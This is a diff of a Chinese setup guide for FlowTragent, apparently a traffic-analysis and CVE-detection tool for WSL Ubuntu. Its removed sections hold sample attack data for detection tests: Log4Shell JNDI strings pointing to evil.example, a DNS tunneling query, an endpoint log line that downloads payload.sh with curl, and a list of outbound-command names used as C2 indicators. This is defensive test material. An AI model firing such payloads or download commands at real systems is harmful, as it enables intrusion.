@@ -1,146 +1,88 @@
 # FlowTragent WSL Ubuntu 启动与测试指南
 
-本文档面向 Windows 11 + WSL2 Ubuntu 环境，目标是从零启动 FlowTragent，并跑通：
+本文档面向 Windows 11 + WSL2 Ubuntu 环境，目标是跑通：
 
 ```text
-PCAP / payload -> CSV -> NOVA-F style retrieval -> Agent analysis -> RAG context -> report
+PCAP / payload / 日志 -> 结构化事件 -> NOVA-F 检索 -> Agent 研判 -> 证据图谱 -> 中英文报告
 ```
 
-## 1. 克隆项目
+## 1. 进入项目
+
+```bash
+cd /mnt/e/ctfcodes/FlowTragent
+```
+
+如果是新机器克隆：
 
 ```bash
 mkdir -p ~/projects
 cd ~/projects
 git clone --recurse-submodules https://github.com/sishijiuhack/FlowTragent.git
 cd FlowTragent
-```
-
-如果已经普通克隆过项目，补拉 NOVA-F 子模块：
-
-```bash
 git submodule update --init --recursive
 ```
 
-作用：`libs/nova-f/` 是 FlowTragent 的底层检索引擎依赖，作为子模块独立管理。
+## 2. 激活 Python 环境
 
-## 2. 创建虚拟环境
-
-推荐使用 Python 3.10 或 3.11。不要使用 Python 3.13，因为 `numpy==1.26.4`、`torch==2.3.1` 等依赖在 Python 3.13 下可能没有稳定 wheel，会触发源码编译失败。
-
-如果你已经在项目里创建过错误版本的 `flowtragent_env`，先删除它：
+推荐 Python 3.11。当前验证过的 conda 环境为：
 
 ```bash
-rm -rf flowtragent_env
-```
-
-如果你正在使用 conda，最省事的方式是直接创建 Python 3.11 环境：
-
-```bash
-conda create -n flowtragent_py311 python=3.11 -y
+source ~/miniconda3/etc/profile.d/conda.sh
 conda activate flowtragent_py311
+python --version
 ```
 
-如果你想使用系统 venv，请确认系统 Python 版本：
+不要使用 Python 3.13 安装当前依赖组合，`numpy`、`torch` 等包可能缺少稳定 wheel，容易触发源码编译或 I/O 错误。
 
-```bash
-python3 --version
-python3.11 --version || true
-```
-
-```bash
-sudo apt update
-sudo apt install -y python3-venv python3-pip git
-
-python3.11 -m venv flowtragent_env
-source flowtragent_env/bin/activate
-python -m pip install --upgrade pip setuptools wheel
-```
-
-看到终端前缀出现 `(flowtragent_env)` 即表示虚拟环境已激活。
-
-## 3. 安装依赖
-
-推荐给 pip 单独指定临时目录，避免 WSL 默认临时目录空间不足：
+## 3. 安装与检查依赖
 
 ```bash
 mkdir -p ~/pip-tmp ~/pip-cache
 TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
-```
-
-验证依赖：
-
-```bash
 python -m pip check
-python - <<'PY'
-import torch, faiss, sentence_transformers, chromadb, langchain, langgraph, scapy
-print("deps ok")
-PY
 ```
 
-## 4. 跑 NOVA 检索 demo
+如果安装 `torch` 途中出现 I/O 错误，先清理临时目录后重试：
 
 ```bash
-python tests/test_nova.py
+rm -rf ~/pip-tmp ~/pip-cache
+mkdir -p ~/pip-tmp ~/pip-cache
+TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
 ```
 
-预期输出里应能看到类似：
+## 4. 构建或使用 NOVA-F 索引
+
+FlowTragent 默认优先读取：
 
 ```text
-CVE-2021-44228
+data/index/faiss.index
+data/index/meta.json
 ```
 
-作用：验证 `NovaClient.search(payload)` 能返回 CVE 候选。
-
-## 5. 跑 PCAP 端到端 demo
-
-生成一个带 Log4Shell 风格 HTTP 请求的 demo PCAP：
+如果使用本地 DataCon 数据集构建索引：
 
 ```bash
-python tests/make_demo_pcap.py
+python scripts/convert_datacon_dataset.py \
+  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
+  --output data/csv/datacon_train_labeled.csv
+
+python scripts/build_demo_index.py \
+  --input data/csv/datacon_train_labeled.csv \
+  --output-dir data/index \
+  --model libs/nova-f/models/all-MiniLM-L6-v2
 ```
 
-该 demo PCAP 同时包含请求和 `HTTP/1.1 200 OK` 响应，用于验证 request/response 配对、状态码提取和 Impact Assessment。
-
-生成命令执行 / payload 下载样本：
+离线或模型不可用时，可使用 hash embedding 跑通功能验证：
 
 ```bash
-python tests/make_post_exploit_pcap.py
-python main.py --mode pcap --input data/pcap/demo_post_exploit.pcap --enable-rag
+FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
+  --input data/csv/datacon_train_labeled.csv \
+  --output-dir data/index
 ```
 
-生成 HTTP beacon / C2 样本：
+## 5. 命令行分析
 
-```bash
-python tests/make_http_beacon_pcap.py
-python main.py --mode pcap --input data/pcap/demo_http_beacon.pcap --enable-rag
-```
-
-运行 FlowTragent：
-
-```bash
-python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index
-```
-
-启用本地 RAG 上下文：
-
-```bash
-python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
-```
-
-查看报告：
-
-```bash
-ls -lh reports/
-tail -n +1 reports/*.md
-```
-
-作用：验证完整链路：
-
-```text
-PCAP -> data/csv/demo_attack.csv -> data/index demo index -> reports/*.md
-```
-
-## 6. payload 直接输入模式
+### 5.1 Payload 模式
 
 ```bash
 python main.py \
@@ -150,11 +92,96 @@ python main.py \
   --enable-rag
 ```
 
-作用：无需 PCAP，直接用单条 payload 验证检索和报告链路。
+### 5.2 PCAP 模式
 
-## 7. Ollama 可选验证
+```bash
+python tests/make_demo_pcap.py
+python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
+```
 
-安装 Ollama：
+### 5.3 后利用与 C2 Demo
+
+```bash
+python tests/make_post_exploit_pcap.py
+python main.py --mode pcap --input data/pcap/demo_post_exploit.pcap --enable-rag
+
+python tests/make_http_beacon_pcap.py
+python main.py --mode pcap --input data/pcap/demo_http_beacon.pcap --enable-rag
+```
+
+### 5.4 Live 抓包模式
+
+```bash
+sudo apt update
+sudo apt install -y tcpdump
+sudo $(which python) main.py --mode live --interface eth0 --capture-seconds 30 --enable-rag
+```
+
+也可以先手动抓包再分析：
+
+```bash
+sudo tcpdump -i eth0 -w /tmp/test.pcap
+python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports --enable-rag
+```
+
+## 6. 报告输出
+
+每次分析会在 `reports/` 下生成三类文件：
+
+```text
+flowtragent_report_<时间戳>.md       # 英文 Markdown 报告
+flowtragent_report_<时间戳>_zh.md    # 中文 Markdown 报告
+flowtragent_report_<时间戳>.json     # 结构化 JSON
+```
+
+JSON 中的证据图谱同时包含中英文图文本：
+
+```json
+{
+  "evidence_graph": {
+    "mermaid": "English Mermaid graph",
+    "mermaid_zh": "中文 Mermaid 图谱",
+    "dot": "English Graphviz DOT",
+    "dot_zh": "中文 Graphviz DOT"
+  }
+}
+```
+
+查看最新报告：
+
+```bash
+ls -lt reports/*.md | head
+tail -n +1 "$(ls -t reports/*_zh.md | head -1)"
+```
+
+## 7. Web 界面
+
+启动 Flask Web UI：
+
+```bash
+python web_app.py
+```
+
+浏览器打开：
+
+```text
+http://127.0.0.1:5000
+```
+
+Web UI 支持：
+
+- 直接输入 payload 分析。
+- 上传 PCAP、Access Log、DNS Log、Endpoint Log。
+- 勾选 demo index、RAG、Ollama。
+- 在报告详情页使用“中文 / English”切换报告语言。
+- 证据图谱的 Mermaid 和 Graphviz DOT 文本会跟随语言切换。
+- `/graph-svg/<report.json>?lang=zh|en` 会按语言渲染 SVG 图。
+
+如果 Windows 浏览器无法访问 WSL 服务，可临时把 `web_app.py` 末尾监听地址从 `127.0.0.1` 改为 `0.0.0.0` 后重启。
+
+## 8. Ollama 可选验证
+
+安装并拉取轻量模型：
 
 ```bash
 curl -fsSL https://ollama.com/install.sh | sh
@@ -167,598 +194,43 @@ ollama pull phi3:mini
 OLLAMA_HOST=0.0.0.0:11434 ollama serve
 ```
 
-另开一个 WSL 终端测试：
+测试：
 
 ```bash
-curl http://127.0.0.1:11434/api/generate \
-  -d '{"model":"phi3:mini","prompt":"Summarize Log4Shell in one sentence.","stream":false}'
-```
-
-让 FlowTragent 调用 Ollama：
-
-```bash
-source flowtragent_env/bin/activate
-python main.py \
-  --mode pcap \
-  --input data/pcap/demo_attack.pcap \
-  --demo-index \
-  --enable-rag \
-  --enable-ollama
-```
-
-如果 Ollama 未启动，报告仍会生成，只是 `Agent Summary` 会提示 Ollama 不可用。
-
-## 8. Web 界面
-
-启动 Flask Web 界面：
-
-```bash
-source flowtragent_env/bin/activate
-python web_app.py
-```
-
-然后在浏览器打开：
-
-```text
-http://127.0.0.1:5000
-```
-
-可以直接输入 payload，或上传 `.pcap/.pcapng` 文件生成报告。
-
-如果在 Windows 浏览器访问 WSL 服务失败，确认 Flask 监听地址，必要时把 `web_app.py` 里的 `127.0.0.1` 改为 `0.0.0.0`。
-
-## 9. live 抓包模式
-
-安装 tcpdump：
-
-```bash
-sudo apt update
-sudo apt install -y tcpdump
-```
-
-查看网卡：
-
-```bash
-ip addr
-```
-
-抓取 30 秒流量并分析：
-
-```bash
-sudo ~/projects/FlowTragent/flowtragent_env/bin/python main.py \
-  --mode live \
-  --interface eth0 \
-  --capture-seconds 30 \
-  --output-dir ./reports \
-  --enable-rag
-```
-
-如果你想先手动抓包：
-
-```bash
-sudo tcpdump -i eth0 -w /tmp/test.pcap
-python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports --enable-rag
-```
-
-## 10. 使用真实 NOVA-F 风格索引
-
-FlowTragent 默认读取：
-
-```text
-data/index/faiss.index
-data/index/meta.json
-```
-
-如果这两个文件存在，`NovaClient` 会优先使用真实索引；如果不存在或加了 `--demo-index`，才会使用 demo 索引。
-
-训练 CSV 至少包含：
-
-```text
-id,payload_clean,cve_labels
-```
-
-示例：
-
-```csv
-id,payload_clean,cve_labels
-1,"GET /?x=${jndi:ldap://a/b} HTTP/1.1","CVE-2021-44228"
-```
-
-构建索引：
-
-```bash
-python scripts/build_demo_index.py \
-  --input data/csv/train_payloads.csv \
-  --output-dir data/index \
-  --model libs/nova-f/models/all-MiniLM-L6-v2
-```
-
-离线或 HuggingFace 不可用时，可使用本地哈希 embedding：
-
-```bash
-FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
-  --input data/csv/train_payloads.csv \
-  --output-dir data/index
-```
-
-注意：
-
-- DataCon2025 官方授权数据集当前未随仓库分发，也不建议直接提交到公开仓库。
-- 如需补充真实索引，请使用你本地拥有授权的数据集，转换为 `id,payload_clean,cve_labels` CSV 后构建。
-- NOVA-F 新版子模块中提供了更多数据转换、评估、规则和结构化特征工具，可在 `libs/nova-f/utils/` 与 `libs/nova-f/src/` 下查看。
-
-如果官方数据集位于：
-
-```text
-libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz
-```
-
-可直接转换带 CVE 标签的训练样本：
-
-```bash
-python scripts/convert_datacon_dataset.py \
-  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
-  --output data/csv/datacon_train_labeled.csv
-```
-
-再构建 FlowTragent 检索索引：
-
-```bash
-python scripts/build_demo_index.py \
-  --input data/csv/datacon_train_labeled.csv \
-  --output-dir data/index \
-  --model libs/nova-f/models/all-MiniLM-L6-v2
-```
-
-如果只想做离线冒烟测试：
-
-```bash
-FLOWTRAGENT_OFFLINE=1 python scripts/convert_datacon_dataset.py \
-  --input libs/nova-f/data/datacon2025-xlab-httpcve/data-release/train.json.gz \
-  --output data/csv/datacon_train_labeled_sample.csv \
-  --limit 1000
-
-FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
-  --input data/csv/datacon_train_labeled_sample.csv \
-  --output-dir data/index
-```
-
-本地可用模型目录：
-
-```text
-libs/nova-f/models/all-MiniLM-L6-v2
-libs/nova-f/models/bge-small-en-v1.5
-libs/nova-f/models/e5-small-v2
-```
-
-默认推荐先用 `all-MiniLM-L6-v2`，速度和资源占用更适合 WSL CPU 环境。
-
-## 11. 常见错误修复
-
-### pip 提示 No space left on device
-
-```bash
-mkdir -p ~/pip-tmp ~/pip-cache
-TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
-```
-
-### 找不到 venv
-
-```bash
-sudo apt update
-sudo apt install -y python3-venv python3-pip
-```
-
-### tcpdump 权限问题
-
-优先使用 `sudo`。如果想给 tcpdump 授权：
-
-```bash
-sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"
-```
-
-### HuggingFace 证书或网络失败
-
-demo 和 RAG 默认可以离线运行：
-
-```bash
-FLOWTRAGENT_OFFLINE=1 python tests/test_nova.py
-FLOWTRAGENT_OFFLINE=1 python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
-```
-
-### WSL 访问 Ollama 失败
-
-确认 Ollama 监听地址：
-
-```bash
-OLLAMA_HOST=0.0.0.0:11434 ollama serve
-curl http://127.0.0.1:11434/api/tags
-```
-
-## 12. DNS/TCP C2 样本验证
-
-生成并分析 DNS tunneling + TCP beacon 样本：
-
-```bash
-python tests/make_dns_tcp_c2_pcap.py
-python main.py --mode pcap --input data/pcap/demo_dns_tcp_c2.pcap --demo-index
-```
-
-运行对应回归测试：
-
-```bash
-python tests/test_dns_tcp_c2_pipeline.py
-```
-
-预期报告中应包含：
-
-```text
-DNS C2 / Tunneling
-TCP Beacon
-Possible compromise with C2 indicators
-```
-
-作用：验证 FlowTragent 在没有 HTTP payload 的 PCAP 中，仍能基于 DNS 查询模式和 TCP 周期连接识别疑似 C2 行为，并生成 Markdown/JSON 报告。
-
-## 13. Ollama 结构化摘要联调
-
-启动 Ollama 并拉取轻量模型：
-
-```bash
-ollama serve
-ollama pull phi3:mini
-```
-
-另开一个 WSL 终端运行 smoke test：
-
-```bash
-conda activate flowtragent_py311
-cd /mnt/e/ctfcodes/FlowTragent
 python scripts/ollama_smoke_test.py --host http://127.0.0.1:11434 --model phi3:mini
 ```
 
-如果 Ollama 未启动，脚本会输出：
+如果 Ollama 不可用，FlowTragent 仍会生成确定性 Agent 报告，只是 LLM 结构化摘要会标记为不可用或降级。
 
-```text
-ollama_unavailable
-```
-
-如果模型未拉取，脚本会输出：
-
-```text
-model_unavailable
-```
-
-此时可以先拉取模型：
+## 9. 推荐测试集
 
 ```bash
-ollama pull phi3:mini
-```
-
-或者使用脚本输出的本地已有模型，例如：
-
-```bash
-python scripts/ollama_smoke_test.py --host http://127.0.0.1:11434 --model qwen2.5-coder:1.5b-base
-```
-
-如果 Ollama 可用，脚本会生成 demo PCAP、运行 FlowTragent，并输出：
-
-```text
-llm_status
-retry_attempted
-supported_claims
-unsupported_claims
-```
-
-作用：验证 LLM 只生成结构化摘要，并且所有 supported claim 都必须引用有效的 `evidence_id`。
-
-## 14. 多源证据融合：PCAP + 日志
-
-FlowTragent 现在支持在 PCAP 分析时额外合并 Web access log、DNS log、endpoint/process log。
-
-### 14.1 Web access log
-
-支持常见 Nginx/Apache combined log，也支持 JSONL/CSV。
-
-```bash
-python main.py \
-  --mode pcap \
-  --input data/pcap/demo_attack.pcap \
-  --demo-index \
-  --access-log logs/access.log
-```
-
-常见 combined log 示例：
-
-```text
-10.10.10.5 - - [27/Jun/2026:06:40:00 +0000] "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1" 200 2 "-" "curl/8.0"
-```
-
-### 14.2 DNS log
-
-支持 JSONL/CSV。推荐字段：
-
-```text
-timestamp,src_ip,dst_ip,query,qtype
-```
-
-JSONL 示例：
-
-```json
-{"timestamp":"2026-06-27T06:40:30Z","src_ip":"10.10.10.20","dst_ip":"8.8.8.8","query":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example","qtype":"TXT"}
-```
-
-运行：
-
-```bash
-python main.py \
-  --mode pcap \
-  --input data/pcap/demo_attack.pcap \
-  --demo-index \
-  --dns-log logs/dns.jsonl
-```
-
-### 14.3 Endpoint / process log
-
-支持 JSONL/CSV。推荐字段：
-
-```text
-timestamp,host,process_name,command_line,dst_ip,dst_port
-```
-
-CSV 示例：
-
-```csv
-timestamp,host,process_name,command_line,dst_ip,dst_port
-2026-06-27T06:41:00Z,10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080
-```
-
-运行：
-
-```bash
-python main.py \
-  --mode pcap \
-  --input data/pcap/demo_attack.pcap \
-  --demo-index \
-  --endpoint-log logs/endpoint.csv
-```
-
-### 14.4 多日志同时输入
-
-```bash
-python main.py \
-  --mode pcap \
-  --input data/pcap/demo_attack.pcap \
-  --demo-index \
-  --enable-rag \
-  --access-log logs/access.log \
-  --dns-log logs/dns.jsonl \
-  --endpoint-log logs/endpoint.csv
-```
-
-作用：
-
-- PCAP 负责还原网络流量和 CVE 候选召回。
-- Access log 用于补充 HTTP 状态码、URI、User-Agent 和入口证据。
-- DNS log 用于补充 DNS C2 / tunneling 证据。
-- Endpoint log 用于确认命令执行、payload 下载、落地文件和外联进程。
-- Agent Evidence Pack 会统一记录 packet/log 证据 ID，例如 `pkt-1`、`access1-1`、`dnslog1-1`、`endpoint1-1`。
-
-验证命令：
-
-```bash
-python tests/test_log_parser.py
+python -m py_compile src/correlation/evidence_graph.py src/report/generator.py web_app.py
+python tests/test_nova.py
+python tests/test_pipeline.py
 python tests/test_multisource_pipeline.py
-```
-
-## 15. Evidence Graph 证据关联图
-
-FlowTragent 现在会在 JSON 报告中输出：
-
-```text
-evidence_graph.nodes
-evidence_graph.edges
-```
-
-Markdown 报告中对应章节为：
-
-```text
-## Evidence Graph
-```
-
-当前支持的关系类型：
-
-```text
-same_asset
-```
-
-表示网络事件和 endpoint/process 事件指向同一资产，例如 PCAP 目标 IP 与 endpoint log 的 host/host_ip 一致。
-
-```text
-temporal_sequence
-```
-
-表示两个证据事件在时间线上相邻，默认 600 秒窗口内会建立顺序关系。
-
-```text
-process_external_connection
-```
-
-表示 endpoint/process 日志中出现 `curl/wget/powershell/certutil/bash -c` 等命令，并带有远端目的地址。
-
-```text
-process_to_network_destination
-```
-
-表示 endpoint/process 日志中的远端目的地址与网络证据中的目的地址一致。
-
-```text
-c2_sequence:HTTP Beacon / DNS C2 / TCP Beacon
-```
-
-表示 C2 detector 识别出的周期性通信证据序列。
-
-示例 JSON edge：
-
-```json
-{
-  "source_id": "pkt-1",
-  "target_id": "endpoint1-1",
-  "relation": "same_asset",
-  "confidence": "high",
-  "reason": "Network target/source matches endpoint host or host IP."
-}
-```
-
-作用：Evidence Graph 用于把 `pkt-1 -> endpoint1-1 -> dnslog1-1` 这类跨源关系显式化，后续可以直接用于攻击链可视化、Graph RAG 或更细粒度 Agent 推理。
-
-## 16. Mermaid 攻击链可视化
-
-Evidence Graph 现在会同时输出 Mermaid flowchart：
-
-```text
-evidence_graph.mermaid
-```
-
-Markdown 报告的 `## Evidence Graph` 章节会包含：
-
-````markdown
-```mermaid
-flowchart TD
-  pkt_1["pkt-1\nHTTP\nGET /?x=${jndi:ldap://evil.example/a} ..."]
-  endpoint1_1["endpoint1-1\nENDPOINT\nbash -c whoami; curl ..."]
-  pkt_1 -->|same_asset| endpoint1_1
-  endpoint1_1 -->|process_external_connection| external_203_0_113_50_8080
-```
-````
-
-用途：
-
-- 在支持 Mermaid 的 Markdown 查看器中直接渲染攻击链图。
-- 快速观察入口流量、主机执行、外联/C2 之间的关系。
-- 后续可以把该图导出到报告系统或 Web UI。
-
-验证命令：
-
-```bash
-python tests/test_multisource_pipeline.py
-```
-
-## 17. Web UI Mermaid 图谱查看
-
-Web UI 现在可以直接查看报告中的 Evidence Graph Mermaid 图。
-
-启动：
-
-```bash
-python web_app.py
-```
-
-浏览器打开：
-
-```text
-http://127.0.0.1:5000
-```
-
-当前 Web UI 支持：
-
-- Payload 直接分析。
-- PCAP 上传分析。
-- Access Log / DNS Log / Endpoint Log 可选上传。
-- 最近报告列表。
-- 报告详情页 `/view-report/<report.md>`。
-- Evidence Graph Mermaid 渲染。
-- Attack Chain 表格展示。
-- Graph Edges 表格展示。
-- Markdown / JSON 报告查看。
-
-说明：Mermaid 渲染使用浏览器端 CDN。如果离线环境无法访问 CDN，报告中的 Mermaid 源码和边表仍然可见，不影响分析结果。
-
-验证命令：
-
-```bash
 python tests/test_web_app.py
+python tests/test_agent_orchestrator.py
+python tests/test_langgraph_runner.py
+python tests/test_dns_tcp_c2_pipeline.py
+python tests/test_post_exploit_and_c2_pipeline.py
+python tests/test_llm_summary.py
+python -m pip check
 ```
 
-## 18. Graphviz DOT / PNG 离线导出
+## 10. 常见问题
 
-Evidence Graph 现在同时输出 Graphviz DOT：
+### 10.1 Chroma telemetry 报错
+
+看到类似信息通常不影响报告生成：
 
 ```text
-evidence_graph.dot
+Failed to send telemetry event ...
 ```
 
-Markdown 报告中会包含：
+这是 ChromaDB telemetry 兼容性问题，可忽略。
 
-```graphviz
-digraph FlowTragentEvidence {
-  rankdir=LR;
-  "pkt-1" -> "endpoint1-1" [label="same_asset"];
-}
-```
-
-如果需要离线生成 PNG，可以安装 Graphviz：
-
-```bash
-sudo apt update
-sudo apt install -y graphviz
-```
-
-从 JSON 报告导出 DOT：
-
-```bash
-python scripts/export_graphviz.py reports/flowtragent_report_xxx.json
-```
-
-导出 DOT 和 PNG：
-
-```bash
-python scripts/export_graphviz.py \
-  reports/flowtragent_report_xxx.json \
-  --png-output reports/flowtragent_graph.png
-```
-
-如果没有安装 Graphviz，脚本会只写 DOT，并提示：
-
-```text
-sudo apt install graphviz
-```
-
-验证命令：
-
-```bash
-python tests/test_export_graphviz.py
-```
-
-## 19. 证据路径、日志适配、离线图谱与中文报告增强
-
-本阶段完成 5 项增强：
-
-### 19.1 Agent 引用 evidence_graph 路径
-
-`evidence_graph` 现在新增：
-
-```text
-evidence_graph.paths
-```
-
-示例：
-
-```text
-pkt-1 --same_asset--> endpoint1-1 --process_external_connection--> external:203.0.113.50:8080
-```
-
-Agent 会在 `key_findings` 和 reasoning 中引用关键证据路径，用于解释“入口流量 -> 主机执行 -> 外联”的链路。
-
-### 19.2 Web UI 离线图谱渲染
-
-Web UI 不再只依赖 Mermaid CDN。报告详情页会调用：
-
-```text
-/graph-svg/<report.json>
-```
-
-如果系统安装了 Graphviz `dot`，页面会直接渲染本地 SVG；如果未安装，则显示 DOT 源码。
+### 10.2 Graphviz SVG 不显示
 
 安装 Graphviz：
 
@@ -767,139 +239,25 @@ sudo apt update
 sudo apt install -y graphviz
 ```
 
-### 19.3 真实日志格式适配
+没有 Graphviz 时，Web UI 会回退展示 DOT 文本。
 
-日志 parser 增强支持：
-
-- Nginx / Apache access log
-- JSONL / CSV access log
-- Zeek TSV DNS log（`#fields ts id.orig_h id.resp_h query qtype_name`）
-- Suricata EVE JSON DNS / HTTP 字段
-- Sysmon JSON 常见字段：`EventData.CommandLine`、`DestinationIp`、`DestinationPort`、`Image`
-
-验证：
+### 10.3 PCAP 抓包权限不足
 
 ```bash
-python tests/test_log_parser.py
+sudo tcpdump -i eth0 -w /tmp/test.pcap
+sudo $(which python) main.py --mode live --interface eth0 --capture-seconds 30 --enable-rag
 ```
 
-### 19.4 Endpoint 外联与 C2 关联增强
+### 10.4 不要提交本地大文件
 
-`c2_detector.py` 新增：
+以下内容通常不应提交到 GitHub：
 
 ```text
-Endpoint External Connection
-```
-
-当 endpoint/process 日志出现 `curl/wget/powershell/certutil/bash -c/nc` 等外联命令，且存在远端 IP/端口时，会生成 C2 线索。
-
-如果该外联目的也出现在网络证据中，置信度提升。
-
-### 19.5 中文报告摘要
-
-Markdown 报告新增：
-
-```text
-## 中文摘要
-```
-
-包含：
-
-- 研判结论
-- 置信度
-- 研判依据
-- 首要 CVE 候选
-- 关键证据路径
-
-示例结论：
-
-```text
-疑似成功利用并伴随 C2 通信迹象
-```
-
-### 19.6 当前推荐验证命令
-
-```bash
-python tests/test_log_parser.py
-python tests/test_multisource_pipeline.py
-python tests/test_web_app.py
-python tests/test_export_graphviz.py
-python tests/test_pipeline.py
-python -m pip check
-```
-
-## 20. 产品化增强：ATT&CK、NVD、评估、Web 管理、生产启动
-
-### 20.1 ATT&CK 映射
-
-报告新增：
-
-```text
-## ATT&CK Mapping
-```
-
-当前映射示例：
-
-- Exploitation -> T1190 Exploit Public-Facing Application
-- Command Execution -> T1059 Command and Scripting Interpreter
-- Payload Delivery -> T1105 Ingress Tool Transfer
-- WebShell / Backdoor -> T1505.003 Web Shell
-- DNS C2 / Tunneling -> T1071.004 DNS
-
-### 20.2 NVD 同步
-
-在线同步：
-
-```bash
-python scripts/sync_nvd.py --keyword apache --output data/rag/nvd_cves.jsonl
-```
-
-离线转换 NVD API JSON fixture：
-
-```bash
-python scripts/sync_nvd.py --input-json data/nvd_fixture.json --output data/rag/nvd_cves.jsonl
-```
-
-### 20.3 DataCon 索引评估
-
-```bash
-python scripts/evaluate_datacon_index.py \
-  --input data/csv/datacon_train_labeled.csv \
-  --index-dir data/index \
-  --model libs/nova-f/models/all-MiniLM-L6-v2 \
-  --top-k 5 \
-  --limit 200
-```
-
-输出：
-
-```text
-samples
-top1_accuracy
-topk_recall
-misses
-```
-
-### 20.4 Web UI 报告管理
-
-Web UI 现在支持：
-
-- 按文件名搜索报告。
-- 删除单个报告及同名 JSON/DOT/PNG/SVG。
-- 批量导出 ZIP：`/export-reports.zip`。
-
-### 20.5 生产启动
-
-新增：
-
-```text
-scripts/run_web_prod.sh
-docs/Production_Deploy_CN.md
-```
-
-推荐：
-
-```bash
-python -m pip install gunicorn
-FLOWTRAGENT_HOST=127.0.0.1 FLOWTRAGENT_PORT=5000 scripts/run_web_prod.sh
+reports/
+data/index/
+data/csv/
+data/tmp/
+libs/nova-f/data/
+libs/nova-f/models/
+docs/FlowTragent_项目进度报告.md
 ```
